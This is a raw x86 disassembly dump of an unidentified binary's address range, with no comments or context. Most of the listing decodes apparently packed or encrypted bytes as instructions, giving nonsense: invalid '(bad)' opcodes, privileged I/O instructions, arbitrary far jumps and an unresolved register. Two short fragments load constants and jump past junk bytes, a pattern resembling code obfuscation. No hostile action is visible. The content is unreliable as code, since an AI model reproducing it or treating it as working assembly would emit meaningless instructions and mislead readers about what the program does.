  40e656:	test   eax,0xe552692a
  40e65b:	outs   dx,BYTE PTR ds:[esi]
  40e65c:	lods   al,BYTE PTR ds:[esi]
  40e65d:	add    ecx,DWORD PTR [ebx+0x55]
  40e660:	cmp    eax,edi
  40e662:	sti    
  40e663:	cdq    
  40e664:	or     al,0xf
  40e666:	fnstsw WORD PTR [esi+0x46]
  40e669:	inc    eax
  40e66a:	jmp    0x40e678
  40e66c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e66d:	lods   eax,DWORD PTR ds:[esi]
  40e66e:	stos   BYTE PTR es:[edi],al
  40e66f:	sub    DWORD PTR [ebx-0x5f],0xaa304165
  40e676:	stos   BYTE PTR es:[edi],al
  40e677:	jne    0x40e654
  40e679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e67a:	pop    ebp
  40e67b:	mov    ds:0x6a35d92e,eax
  40e680:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e681:	adc    cl,BYTE PTR [ebp-0x67]
  40e684:	sbb    al,0xa9
  40e686:	dec    esp
  40e687:	imul   ebx,DWORD PTR [ebx],0xffffff9a
  40e68a:	stos   DWORD PTR es:[edi],eax
  40e68b:	jp     0x40e6db
  40e68d:	mov    DWORD PTR [esi+0x794318cd],ecx
  40e693:	jge    0x40e680
  40e695:	clc    
  40e696:	cmc    
  40e697:	adc    DWORD PTR [edi-0xd],ebp
  40e69a:	enter  0xae14,0x8b
  40e69e:	dec    ebp
  40e69f:	lock mov eax,DWORD PTR [ebp-0x14]
  40e6a3:	sub    eax,ecx
  40e6a5:	mov    ecx,DWORD PTR [ebp-0x18]
  40e6a8:	sub    eax,ecx
  40e6aa:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e6ad:	xor    edx,edx
  40e6af:	div    ecx
  40e6b1:	mov    ecx,DWORD PTR [ebp-0x20]
  40e6b4:	jmp    0x40ea6f
  40e6b9:	addr16 retf 
  40e6bb:	jecxz  0x40e676
  40e6bd:	ja     0x40e678
  40e6bf:	mov    ebp,0x69ce4714
  40e6c4:	inc    ebp
  40e6c5:	and    ebp,DWORD PTR [esi]
  40e6c7:	xor    eax,0xbb03cf71
  40e6cc:	mov    ebx,0xbbbbc5ef
  40e6d1:	mov    eax,0x973b8f9e
  40e6d6:	xchg   esi,eax
  40e6d7:	mov    edi,0x3fbcd359
  40e6dc:	loope  0x40e6cd
  40e6de:	jns    0x40e6e5
  40e6e0:	loope  0x40e725
  40e6e2:	mov    al,0xc4
  40e6e4:	inc    edi
  40e6e5:	leave  
  40e6e6:	cli    
  40e6e7:	fisub  WORD PTR ds:0x41d6742f
  40e6ed:	jp     0x40e682
  40e6ef:	hlt    
  40e6f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6f1:	addr16 (bad) 
  40e6f3:	mov    edx,0xff3ed1c3
  40e6f8:	int    0x74
  40e6fa:	mov    bl,0xb6
  40e6fc:	and    ah,BYTE PTR [ebx]
  40e6fe:	mov    ecx,0xe9161d1b
  40e703:	push   cs
  40e704:	mov    ebx,0x32f880a4
  40e709:	repnz mov ecx,0x4d44f6dd
  40e70f:	push   ds
  40e710:	shl    DWORD PTR [ebp+0x7fb2e981],0x21
  40e717:	mov    ds:0x3b4fde3d,al
  40e71c:	xor    BYTE PTR [ecx+0x5690356],dh
  40e722:	mov    DWORD PTR [eax],ebx
  40e724:	enter  0xe91,0xa9
  40e728:	loope  0x40e6cf
  40e72a:	xchg   esi,eax
  40e72b:	das    
  40e72c:	dec    edx
  40e72d:	data16 loope 0x40e716
  40e730:	leave  
  40e731:	xchg   ecx,eax
  40e732:	push   ecx
  40e733:	xor    eax,0xb7a03030
  40e738:	fst    QWORD PTR ds:0xb0e1131b
  40e73e:	fiadd  WORD PTR [eax+0x313bad08]
  40e744:	and    BYTE PTR [ebx-0x57],bh
  40e747:	jmp    0x5bd5:0xe87cc22b
  40e74e:	sub    DWORD PTR [edx+0x1a],esp
  40e751:	add    ebx,edx
  40e753:	inc    ebx
  40e754:	push   ebx
  40e755:	and    DWORD PTR [edx-0x1ecf4e48],0x53
  40e75c:	or     ch,BYTE PTR [eax]
  40e75e:	popa   
  40e75f:	jo     0x40e78e
  40e761:	inc    esp
  40e762:	pop    edx
  40e763:	js     0x40e6f8
  40e765:	(bad)  
  40e766:	push   edx
  40e767:	retf   0xf5e2
  40e76a:	adc    bl,BYTE PTR [eax+0x183cd0d3]
  40e770:	in     al,0x1
  40e772:	(bad)  
  40e773:	stos   DWORD PTR es:[edi],eax
  40e774:	add    eax,0xf1f5c267
  40e779:	ins    DWORD PTR es:[edi],dx
  40e77a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e77b:	stc    
  40e77c:	dec    ebx
  40e77d:	call   0x253154d1
  40e782:	iret   
  40e783:	sub    bh,BYTE PTR ds:0xdf7212bb
  40e789:	or     al,BYTE PTR [edx+0x26]
  40e78c:	cdq    
  40e78d:	cs dec esp
  40e78f:	mul    DWORD PTR [edx-0x50ab9ebd]
  40e795:	cwde   
  40e796:	push   esi
  40e797:	mov    esp,ss
  40e799:	aam    0x13
  40e79b:	out    dx,eax
  40e79c:	sahf   
  40e79d:	in     al,0xfa
  40e79f:	pop    edx
  40e7a0:	push   ds
  40e7a1:	mov    eax,0x9107e9c4
  40e7a6:	stc    
  40e7a7:	arpl   WORD PTR [edx],ax
  40e7a9:	push   esp
  40e7aa:	loopne 0x40e7e0
  40e7ac:	jmp    0x5ae03e80
  40e7b1:	shr    DWORD PTR [edi+edi*1-0x52435603],0x25
  40e7b9:	mov    bl,0x32
  40e7bb:	and    esi,DWORD PTR [edi-0x14]
  40e7be:	xor    al,BYTE PTR [ebp-0x9]
  40e7c1:	dec    edi
  40e7c2:	mov    dl,0x98
  40e7c4:	xor    al,0x1d
  40e7c6:	cmp    ecx,DWORD PTR [esi-0x4e]
  40e7c9:	arpl   si,dx
  40e7cb:	sbb    al,ch
  40e7cd:	adc    ch,BYTE PTR [edi+0x7bd1b84]
  40e7d3:	cs sub bh,ah
  40e7d6:	add    eax,0x2111ec60
  40e7db:	fistp  WORD PTR [ebx+0x60]
  40e7de:	xor    ax,0x944b
  40e7e2:	mov    ebx,0x15ffba87
  40e7e7:	mov    bl,0x55
  40e7e9:	mov    bh,0x4f
  40e7eb:	call   0x63b1:0xd8037069
  40e7f2:	sub    bh,BYTE PTR [ebp-0x2f]
  40e7f5:	pop    es
  40e7f6:	rol    DWORD PTR [edx-0x44],cl
  40e7f9:	lods   al,BYTE PTR ds:[esi]
  40e7fa:	jbe    0x40e7b7
  40e7fc:	add    cl,BYTE PTR [edx-0x7]
  40e7ff:	and    BYTE PTR [edi-0x1fc4f404],al
  40e805:	jbe    0x40e7e1
  40e807:	adc    DWORD PTR [edi],ecx
  40e809:	mov    edi,0x2aedb81f
  40e80e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e80f:	mov    dh,0xa1
  40e811:	jge    0x40e85f
  40e813:	jl     0x40e7a7
  40e815:	aam    0x57
  40e817:	fwait
  40e818:	and    DWORD PTR [eax-0x38],0xdc658d04
  40e81f:	mul    DWORD PTR [edx-0x75]
  40e822:	dec    edi
  40e823:	xchg   ecx,eax
  40e824:	or     eax,ebp
  40e826:	and    ebx,DWORD PTR [ecx-0x3b1f175d]
  40e82c:	jnp    0x40e7db
  40e82e:	push   ds
  40e82f:	mov    bh,0xf2
  40e831:	mov    ds:0xd237c742,al
  40e836:	push   esi
  40e837:	lea    edx,[ebx-0x77]
  40e83a:	sbb    eax,0x66a67524
  40e83f:	cmp    esi,DWORD PTR [edx]
  40e841:	stos   BYTE PTR es:[edi],al
  40e842:	in     al,0x3e
  40e844:	retf   0x8137
  40e847:	jmp    0x40e83c
  40e849:	shl    DWORD PTR [edi],cl
  40e84b:	inc    edx
  40e84c:	mov    dh,0x48
  40e84e:	out    dx,eax
  40e84f:	mov    edi,eax
  40e851:	inc    ebp
  40e852:	repz sub eax,DWORD PTR [edi+0x1]
  40e856:	adc    eax,0x97484504
  40e85b:	(bad)  
  40e85d:	mov    BYTE PTR [eax+0x6afb510b],dl
  40e863:	repz push ss
  40e865:	dec    eax
  40e866:	not    BYTE PTR [ebp+0x5f943e1c]
  40e86c:	mov    edx,0xe872fa3c
  40e871:	and    eax,0xbca1f7b0
  40e876:	sbb    eax,0xa1372acd
  40e87b:	jecxz  0x40e861
  40e87d:	fmul   DWORD PTR [edi+0x2a]
  40e880:	in     eax,0x70
  40e882:	outs   dx,DWORD PTR ds:[esi]
  40e883:	mov    ds:0xba276933,eax
  40e888:	shl    DWORD PTR [ebp-0x38b01c14],cl
  40e88e:	mov    ch,0x23
  40e890:	inc    esp
  40e891:	ret    
  40e892:	mov    bh,0xb2
  40e894:	push   eax
  40e895:	js     0x40e8d4
  40e897:	jns    0x40e824
  40e899:	imul   esp,DWORD PTR [ebx-0x7f20898a],0x5e
  40e8a0:	icebp  
  40e8a1:	pusha  
  40e8a2:	mov    bl,0xca
  40e8a4:	addr16 ret 0xcc3d
  40e8a8:	inc    ecx
  40e8a9:	loope  0x40e834
  40e8ab:	pushf  
  40e8ac:	xlat   BYTE PTR ds:[ebx]
  40e8ad:	pop    edx
  40e8ae:	xchg   esi,eax
  40e8af:	cwde   
  40e8b0:	popf   
  40e8b1:	xlat   BYTE PTR ds:[ebx]
  40e8b2:	fsubr  QWORD PTR [edx]
  40e8b4:	fs xchg ecx,eax
  40e8b6:	fisttp QWORD PTR [edx-0x74774c74]
  40e8bc:	xlat   BYTE PTR ds:[ebx]
  40e8bd:	mov    esp,fs
  40e8bf:	clc    
  40e8c0:	mov    ds:0x247fca4b,al
  40e8c5:	add    eax,0xf215c1ec
  40e8ca:	cmp    bh,bl
  40e8cc:	inc    ebx
  40e8cd:	ds je  0x40e8e7
  40e8d0:	or     ebp,DWORD PTR [ebp-0x7ca994f0]
  40e8d6:	mov    bl,0x8e
  40e8d8:	clc    
  40e8d9:	inc    ebx
  40e8da:	pop    ss
  40e8db:	out    dx,eax
  40e8dc:	or     DWORD PTR [edi+edi*2+0x4e],0x2f
  40e8e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8e2:	sbb    cl,BYTE PTR [esi+ebx*2+0x35b1815c]
  40e8e9:	jl     0x40e8b9
  40e8eb:	lods   al,BYTE PTR ds:[esi]
  40e8ec:	pusha  
  40e8ed:	ficom  WORD PTR [esi-0x6b24c5f0]
  40e8f3:	add    DWORD PTR [edi+0x1],esi
  40e8f6:	mov    al,0x40
  40e8f8:	sbb    ebx,DWORD PTR ds:0x6acbf2fa
  40e8fe:	ret    
  40e8ff:	mov    DWORD PTR [edx+0x27faeb20],eax
  40e905:	mov    dl,0x94
  40e907:	jmp    0x40e928
  40e909:	jo     0x40e951
  40e90b:	out    dx,eax
  40e90c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e90d:	push   eax
  40e90e:	jecxz  0x40e97c
  40e910:	mov    ah,0x6d
  40e912:	add    ebp,ebp
  40e914:	lea    eax,[ecx]
  40e916:	cmp    cl,BYTE PTR [esi+0x41]
  40e919:	mov    edi,0xb99647c4
  40e91e:	test   ch,bh
  40e920:	add    DWORD PTR [ebx+0x5b],ebp
  40e923:	fsub   QWORD PTR [edi+0x2e42981f]
  40e929:	xor    ebp,edx
  40e92b:	fdivr  DWORD PTR [edx+edx*1]
  40e92e:	xor    al,0xbd
  40e930:	and    BYTE PTR [eax-0x20],0xe2
  40e934:	ss or  al,0xb8
  40e937:	sbb    bl,bh
  40e939:	cdq    
  40e93a:	xor    edi,DWORD PTR [ebx-0x2b]
  40e93d:	mov    ds:0x56293c17,al
  40e942:	jecxz  0x40e8f9
  40e944:	mov    eax,0xddaf9b6e
  40e949:	enter  0x1c8b,0x7a
  40e94d:	aas    
  40e94e:	push   edx
  40e94f:	mov    DWORD PTR [ebx+eax*4],edi
  40e952:	lahf   
  40e953:	xchg   ecx,eax
  40e954:	scas   eax,DWORD PTR es:[edi]
  40e955:	push   ebp
  40e956:	jne    0x40e93c
  40e958:	xor    ebx,edi
  40e95a:	mov    ecx,0xba19efad
  40e95f:	imul   ebp,edi,0xffffff93
  40e962:	and    bl,BYTE PTR [edi]
  40e964:	mov    edi,eax
  40e966:	out    dx,eax
  40e967:	cli    
  40e968:	pop    esi
  40e969:	outs   dx,BYTE PTR ds:[esi]
  40e96a:	das    
  40e96b:	and    eax,0x4b5b07ff
  40e970:	arpl   WORD PTR [esi+0x63],bx
  40e973:	inc    edi
  40e974:	add    BYTE PTR [esi+0x14],dl
  40e977:	arpl   si,bx
  40e979:	dec    ebp
  40e97a:	pop    edx
  40e97b:	jo     0x40e989
  40e97d:	mov    edx,0xd5d5ac35
  40e982:	inc    ebp
  40e983:	xchg   ecx,eax
  40e984:	lea    ebp,[esi]
  40e986:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e987:	mov    esp,0x8074ab34
  40e98c:	xchg   edx,eax
  40e98d:	xchg   DWORD PTR [edx+0x70e3777f],ecx
  40e993:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e994:	iret   
  40e995:	pop    ecx
  40e996:	stc    
  40e997:	scas   eax,DWORD PTR es:[edi]
  40e998:	ret    
  40e999:	dec    esi
  40e99a:	push   cs
  40e99b:	xor    DWORD PTR [ecx+0x600464ed],ecx
  40e9a1:	mov    edi,ds
  40e9a3:	icebp  
  40e9a4:	add    DWORD PTR [edx+0xe],esp
  40e9a7:	aas    
  40e9a8:	pop    ds
  40e9a9:	cld    
  40e9aa:	jmp    0x8e45:0x896396a3
  40e9b1:	sti    
  40e9b2:	xor    DWORD PTR [eax+0x5d],0x523a9a4
  40e9b9:	mov    ?,WORD PTR [edx]
  40e9bb:	mov    WORD PTR [ebp+0x9],?
  40e9be:	cmp    ecx,0x47dc17ef
  40e9c4:	xor    eax,DWORD PTR ds:0xf93aa808
  40e9ca:	test   al,0xa
  40e9cc:	sbb    bl,BYTE PTR [eax+edi*2+0x3b]
  40e9d0:	xor    al,0x55
  40e9d2:	(bad)  
  40e9d3:	cmp    DWORD PTR [ecx+edi*1],edi
  40e9d6:	out    0x0,al
  40e9d8:	ret    0xf8cb
  40e9db:	test   DWORD PTR [esi],edx
  40e9dd:	and    dh,BYTE PTR [ebx+0x36]
  40e9e0:	pop    esp
  40e9e1:	jnp    0x40ea34
  40e9e3:	or     ebx,edx
  40e9e5:	mov    ecx,0xd125b257
  40e9ea:	inc    esp
  40e9eb:	lock push ds
  40e9ed:	lahf   
  40e9ee:	dec    eax
  40e9ef:	fwait
  40e9f0:	xchg   esi,eax
  40e9f1:	xor    eax,0xa0f08ba
  40e9f6:	inc    ebx
  40e9f7:	in     eax,dx
  40e9f8:	sub    ebp,ecx
  40e9fa:	dec    ebx
  40e9fb:	pushf  
  40e9fc:	inc    ebp
  40e9fd:	sbb    BYTE PTR [edx],cl
  40e9ff:	dec    eax
  40ea00:	or     al,0x75
  40ea02:	pop    ebp
  40ea03:	pop    ebx
  40ea04:	sub    DWORD PTR [edx+edi*8+0x50],0x4fccbc3f
  40ea0c:	dec    ebp
  40ea0d:	jns    0x40ea6c
  40ea0f:	scas   al,BYTE PTR es:[edi]
  40ea10:	xor    BYTE PTR [eax+edx*1-0x7038be79],bh
  40ea17:	mov    ebx,0x900a128f
  40ea1c:	and    al,0xc7
  40ea1e:	cmp    eax,0x67e6ec9a
  40ea23:	cmp    eax,0x8c419d9f
  40ea28:	test   BYTE PTR [ecx+0x30679445],al
  40ea2e:	dec    esi
  40ea2f:	mov    ah,0x8f
  40ea31:	stos   DWORD PTR es:[edi],eax
  40ea32:	(bad)  
  40ea33:	xor    eax,0x3574f0e7
  40ea38:	mov    al,ds:0xe19f3a78
  40ea3d:	and    eax,0x11cf8df4
  40ea42:	push   ecx
  40ea43:	mov    bl,0xd0
  40ea45:	sbb    al,0xf5
  40ea47:	popf   
  40ea48:	fcmove st,st(5)
  40ea4a:	sar    al,cl
  40ea4c:	push   0x1c0df0fe
  40ea51:	imul   esi,DWORD PTR [edx],0xf4683eac
  40ea57:	shl    BYTE PTR [ebp-0x9],1
  40ea5a:	dec    ebp
  40ea5b:	lods   eax,DWORD PTR ds:[esi]
  40ea5c:	adc    dl,BYTE PTR [eax+0x68125f27]
  40ea62:	xchg   edi,eax
  40ea63:	mov    bh,0x1d
  40ea65:	mov    al,0x26
  40ea67:	push   eax
  40ea68:	bound  eax,QWORD PTR [ebx]
  40ea6a:	inc    edx
  40ea6b:	jae    0x40ea17
  40ea6d:	call   FWORD PTR [eax+0x1708848d]
  40ea73:	and    al,BYTE PTR [eax]
  40ea75:	add    BYTE PTR ds:0xccee,dh
  40ea7b:	add    eax,DWORD PTR ds:0x42233c
  40ea81:	mov    ds:0x422344,eax
  40ea86:	pop    edi
  40ea87:	pop    esi
  40ea88:	leave  
  40ea89:	ret    
  40ea8a:	push   ebp
  40ea8b:	mov    ebp,esp
  40ea8d:	sub    esp,0x38
  40ea90:	push   ebx
  40ea91:	push   esi
  40ea92:	push   edi
  40ea93:	mov    DWORD PTR [ebp-0x38],0x45fc
  40ea9a:	mov    DWORD PTR [ebp-0x34],0x6d3e
  40eaa1:	mov    DWORD PTR [ebp-0x30],0x3374
  40eaa8:	mov    DWORD PTR [ebp-0x2c],0x7e63
  40eaaf:	mov    DWORD PTR [ebp-0x28],0x655c
  40eab6:	mov    DWORD PTR [ebp-0x24],0x29b4
  40eabd:	mov    DWORD PTR [ebp-0x20],0x2156
  40eac4:	mov    DWORD PTR [ebp-0x1c],0x219e
  40eacb:	mov    DWORD PTR [ebp-0x18],0x2a1f
  40ead2:	mov    DWORD PTR [ebp-0x14],0x2c92
  40ead9:	mov    DWORD PTR [ebp-0x10],0x51d
  40eae0:	mov    DWORD PTR [ebp-0xc],0x6f25
  40eae7:	mov    eax,DWORD PTR [ebp-0x10]
  40eaea:	mov    ecx,DWORD PTR [ebp-0xc]
  40eaed:	mov    edx,DWORD PTR [ebp-0x18]
  40eaf0:	mov    esi,DWORD PTR [ebp-0x14]
  40eaf3:	push   esi
  40eaf4:	jmp    0x40ee72
  40eaf9:	fs iret 
  40eafb:	ins    BYTE PTR es:[edi],dx
  40eafc:	int3   
  40eafd:	jl     0x40eb7c
  40eaff:	gs ja  0x40eb18
  40eb02:	adc    al,0xc4
  40eb04:	cmp    edi,DWORD PTR ds:0x3455d68
  40eb0a:	or     eax,0xc578bbbb
  40eb0f:	mov    ebx,0x345760bb
  40eb14:	adc    DWORD PTR [edi-0x2e919f5f],esi
  40eb1a:	leave  
  40eb1b:	push   esp
  40eb1c:	pusha  
  40eb1d:	sub    DWORD PTR [ebp-0x3e],ecx
  40eb20:	jg     0x40eb3b
  40eb22:	pop    eax
  40eb23:	or     DWORD PTR [edx+0x35517ca4],edx
  40eb29:	std    
  40eb2a:	ins    DWORD PTR es:[edi],dx
  40eb2b:	jg     0x40eb07
  40eb2d:	pop    ss
  40eb2e:	mov    eax,0x99e122d1
  40eb33:	sbb    BYTE PTR [ecx+esi*2-0x70],0x20
  40eb38:	int3   
  40eb39:	add    ah,BYTE PTR [edx]
  40eb3b:	pop    eax
  40eb3c:	mov    edi,0xecf61c4b
  40eb41:	in     al,dx
  40eb42:	fmulp  st(1),st
  40eb44:	call   0xbacd0ba2
  40eb49:	addr16 mov dl,0x7c
  40eb4c:	jle    0x40eb7f
  40eb4e:	div    DWORD PTR [ecx+edx*8+0x43]
  40eb52:	ins    DWORD PTR es:[edi],dx
  40eb53:	and    dl,dl
  40eb55:	test   eax,0xe4623371
  40eb5a:	and    eax,0x3e0dd63
  40eb5f:	fcomp  DWORD PTR [ebx+0x2e]
  40eb62:	dec    sp
  40eb64:	inc    bh
  40eb66:	add    dl,BYTE PTR [ebx+esi*2]
  40eb69:	sti    
  40eb6a:	(bad)  
  40eb6b:	mov    gs,WORD PTR [edi+0x461ad85a]
  40eb71:	inc    edi
  40eb72:	stos   DWORD PTR es:[edi],eax
  40eb73:	xor    DWORD PTR [edi-0x4fefd460],ebp
  40eb79:	jb     0x40eb9a
  40eb7b:	xor    eax,0x26c7d4a3
  40eb80:	mov    esi,0xdbb0151e
  40eb85:	(bad)  
  40eb86:	xor    bh,BYTE PTR [ebx+0x2f547a7]
  40eb8c:	(bad)  
  40eb8d:	ss jecxz 0x40eb55
  40eb90:	in     al,dx
  40eb91:	fisttp QWORD PTR [eax+ecx*1+0x44245d0e]
  40eb98:	(bad)  
  40eb99:	in     eax,dx
  40eb9a:	push   ebx
  40eb9b:	repz out 0xbe,al
  40eb9e:	cmc    
  40eb9f:	(bad)  
  40eba0:	adc    DWORD PTR [ebx],edi
  40eba2:	adc    DWORD PTR [ebx+ecx*2],0x20
  40eba6:	icebp  
  40eba7:	push   esp
  40eba8:	inc    esi
  40eba9:	push   0x7c
  40ebab:	mov    edi,0xa545ceb4
  40ebb0:	xor    cl,BYTE PTR [ecx-0x42]
  40ebb3:	xor    eax,0x8537e111
  40ebb8:	xor    eax,0x7c51961b
  40ebbd:	mov    ecx,0x5fc9832a
  40ebc2:	call   0xb64c:0x3be3b2c4
  40ebc9:	in     eax,dx
  40ebca:	cmp    BYTE PTR [esi+edi*8],al
  40ebcd:	hlt    
  40ebce:	ficomp WORD PTR [ecx]
  40ebd0:	arpl   WORD PTR fs:[ebp-0x319f9dfc],bx
  40ebd7:	add    DWORD PTR [edi+0x1],esp
  40ebda:	test   BYTE PTR [eax],al
  40ebdc:	daa    
  40ebdd:	jne    0x40eb7d
  40ebdf:	jmp    0x106feb9b
  40ebe4:	pop    edi
  40ebe5:	pop    es
  40ebe6:	pop    esi
  40ebe7:	push   0x8d6fc148
  40ebec:	std    
  40ebed:	mov    cl,0xfa
  40ebef:	jns    0x40ec4c
  40ebf1:	inc    edi
  40ebf2:	aaa    
  40ebf3:	je     0x40ebe5
  40ebf5:	xor    al,0x93
  40ebf7:	pop    ss
  40ebf8:	mov    eax,es
  40ebfa:	mov    esp,0xc8e83f5f
  40ebff:	retf   0x1584
  40ec02:	cmc    
  40ec03:	push   ecx
  40ec04:	mov    edx,0x533ca40
  40ec09:	sbb    ebx,DWORD PTR [ecx+0x54dda1da]
  40ec0f:	mov    esp,DWORD PTR [edi+0x67abceda]
  40ec15:	mov    ebx,0x74ea7bf2
  40ec1a:	loop   0x40ebc8
  40ec1c:	push   0x9e6f9dd5
  40ec21:	push   ebp
  40ec22:	fnsave [edx+0x55185680]
  40ec28:	dec    ecx
  40ec29:	outs   dx,BYTE PTR ds:[esi]
  40ec2a:	add    eax,0x1884b06b
  40ec2f:	data16 or BYTE PTR [ebx+0x32ba795],dl
  40ec36:	loope  0x40ebe1
  40ec38:	in     al,0xe0
  40ec3a:	out    dx,eax
  40ec3b:	sbb    cl,BYTE PTR [edx+ebx*2]
  40ec3e:	outs   dx,DWORD PTR ds:[esi]
  40ec3f:	xchg   ebp,eax
  40ec40:	adc    DWORD PTR [ebx+0x5],esp
  40ec43:	je     0x40ec76
  40ec45:	mov    ecx,eax
  40ec47:	mov    eax,DWORD PTR [eax+0x1f]
  40ec4a:	xor    BYTE PTR [eax-0x4f9b6b72],dh
  40ec50:	xchg   DWORD PTR [edi+0x75],esp
  40ec53:	mov    edx,0xecac3c44
  40ec58:	add    BYTE PTR [ebp+ebp*1-0x7c851c91],bh
  40ec5f:	sti    
  40ec60:	xor    ecx,DWORD PTR [esi]
  40ec62:	sub    DWORD PTR [edi+0x2f],0x5d
  40ec66:	jae    0x40ebfd
  40ec68:	sub    al,0x3d
  40ec6a:	inc    esp
  40ec6b:	pop    esp
  40ec6d:	adc    al,0x4d
  40ec6f:	xchg   ebp,eax
  40ec70:	sahf   
  40ec71:	jo     0x40ecda
  40ec73:	mov    ds:0x9cfc87f6,ax
  40ec79:	mov    esp,edx
  40ec7b:	pop    es
  40ec7c:	pop    ds
  40ec7d:	(bad)  
  40ec7e:	adc    bh,dh
  40ec80:	or     DWORD PTR [ebp+0x32f61eda],esi
  40ec86:	sahf   
  40ec87:	sub    edx,esi
  40ec89:	jns    0x40ec18
  40ec8b:	pop    ecx
  40ec8c:	lahf   
  40ec8d:	mov    bl,0xcf
  40ec8f:	cmp    ebx,ebp
  40ec91:	ficomp DWORD PTR [ecx-0x55695ab3]
  40ec97:	fild   WORD PTR [ecx-0x55]
  40ec9a:	mov    ebx,0x70e04811
  40ec9f:	jle    0x40ec5c
  40eca1:	cmp    al,0x1d
  40eca3:	inc    eax
  40eca4:	inc    eax
  40eca5:	xor    al,0x6
  40eca7:	mov    cl,0x67
  40eca9:	xchg   BYTE PTR [ecx-0x5f],ah
  40ecac:	add    BYTE PTR [edx],dl
  40ecae:	inc    edi
  40ecaf:	jge    0x40ed24
  40ecb1:	or     ax,0xaa9a
  40ecb5:	mov    ecx,0x2c7c7ead
  40ecba:	(bad)
  40ecbe:	add    BYTE PTR [ecx+ebp*4-0x39],0x4d
  40ecc3:	pop    es
  40ecc4:	jecxz  0x40ecf0
  40ecc6:	add    al,0x79
  40ecc8:	pop    ecx
  40ecc9:	or     DWORD PTR [edi+0x45e36099],esp
  40eccf:	sbb    DWORD PTR [ebx],ebp
  40ecd1:	test   al,0xd9
  40ecd3:	bnd jg 0x40ed49
  40ecd6:	clc    
  40ecd7:	ud2    
  40ecd9:	sub    dl,BYTE PTR [edx+0x366a8096]
  40ecdf:	push   edi
  40ece0:	or     ch,ah
  40ece2:	jnp    0x40ece8
  40ece4:	cmp    BYTE PTR [esi+0x4e898bed],ch
  40ecea:	mov    bh,0x70
  40ecec:	inc    bx
  40ecee:	rcr    DWORD PTR ss:[edi+0x20],1
  40ecf2:	push   DWORD PTR [esi+ebp*4]
  40ecf5:	xchg   edx,eax
  40ecf6:	mov    dl,0x6a
  40ecf8:	xchg   edi,eax
  40ecf9:	imul   edi,DWORD PTR [esi+eax*2-0x67],0x7451bcac
  40ed01:	dec    ebp
  40ed02:	data16 mov dh,0xfa
  40ed05:	test   BYTE PTR [esi],0x39
  40ed08:	jne    0x40ed00
  40ed0a:	mov    ds,WORD PTR [edi+0x4290dff]
  40ed10:	(bad)  
  40ed11:	int    0xac
  40ed13:	mov    cs,WORD PTR [edx]
  40ed15:	xor    al,0x6a
  40ed17:	clc    
  40ed18:	jmp    0x40eca7
  40ed1a:	mov    edi,0x68fc3360
  40ed1f:	cwde   
  40ed20:	outs   dx,DWORD PTR ds:[esi]
  40ed21:	mov    al,ds:0xee71ab71
  40ed26:	inc    eax
  40ed27:	dec    esi
  40ed28:	push   ss
  40ed29:	in     al,dx
  40ed2a:	pop    esi
  40ed2b:	pop    edi
  40ed2c:	rcr    edi,0x20
  40ed2f:	dec    ecx
  40ed30:	mov    esi,0x7d67396b
  40ed35:	hlt    
  40ed36:	mov    BYTE PTR [eax-0x77],ch
  40ed39:	inc    edi
  40ed3a:	mov    cl,BYTE PTR [ecx]
  40ed3c:	mov    ds,WORD PTR [ebp+ebx*2+0x233cec6]
  40ed43:	js     0x40ed7e
  40ed45:	push   0x7fbabf2e
  40ed4a:	jnp    0x40edc2
  40ed4c:	jnp    0x40ece1
  40ed4e:	xchg   ebx,eax
  40ed4f:	pushf  
  40ed50:	test   DWORD PTR [edx],0x93376896
  40ed56:	xchg   esp,eax
  40ed57:	shl    DWORD PTR [esi-0x9f6978],1
  40ed5d:	sahf   
  40ed5e:	test   BYTE PTR ds:0xf72c2c72,al
  40ed64:	mov    dl,0x83
  40ed66:	or     DWORD PTR ds:0x53a4e352,ecx
  40ed6c:	inc    ebx
  40ed6d:	rcl    bl,cl
  40ed6f:	iret   
  40ed70:	pop    ebp
  40ed71:	int3   
  40ed72:	dec    ebp
  40ed73:	loop   0x40ed6f
  40ed75:	imul   esp,DWORD PTR [esi-0x26369d03],0x5f
  40ed7c:	rol    DWORD PTR [ecx+0x598c944e],1
  40ed82:	inc    ebp
  40ed83:	or     BYTE PTR [edx-0x1],ch
  40ed86:	jmp    0x40ed93
  40ed88:	xchg   esp,eax
  40ed89:	sbb    eax,0xb0c24b50
  40ed8e:	retf   0x3cd
  40ed91:	or     BYTE PTR [esi],ah
  40ed93:	cmp    dl,BYTE PTR [ecx+0x59]
  40ed96:	test   al,0xf9
  40ed98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed99:	call   0x71bf:0xfab1e43a
  40eda0:	pop    esp
  40eda1:	sar    BYTE PTR [edi+ebp*1+0x18198ca9],0x7c
  40eda9:	push   esp
  40edaa:	stc    
  40edab:	into   
  40edac:	sub    al,0xc
  40edae:	test   DWORD PTR [ebp+0x782c4961],ecx
  40edb4:	pop    ss
  40edb5:	push   esi
  40edb6:	or     al,BYTE PTR [ebx-0x3343f61a]
  40edbc:	cdq    
  40edbd:	or     BYTE PTR [esp+ebp*2+0x1f],dl
  40edc1:	push   0x8
  40edc3:	std    
  40edc4:	out    0x64,eax
  40edc6:	fs ds mov eax,0x381507dd
  40edcd:	in     al,0x35
  40edcf:	push   0xa6231327
  40edd4:	sbb    DWORD PTR [ebp+0x68],edi
  40edd7:	ds sbb al,0x79
  40edda:	or     al,0x62
  40eddc:	in     eax,0x88
  40edde:	test   BYTE PTR [edi],ah
  40ede0:	jl     0x40ed64
  40ede2:	retf   0x8b18
  40ede5:	or     dl,BYTE PTR [edi+0x5d]
  40ede8:	pop    edx
  40ede9:	xlat   BYTE PTR ds:[ebx]
  40edea:	mov    edi,0xdb9d59e2
  40edef:	out    0x4d,eax
  40edf1:	adc    eax,0x22fa0eea
  40edf6:	jae    0x40ee46
  40edf8:	dec    esp
  40edf9:	add    BYTE PTR [esi],ch
  40edfb:	jo     0x40ee6c
  40edfd:	into   
  40edfe:	adc    DWORD PTR [ecx+0x76],esp
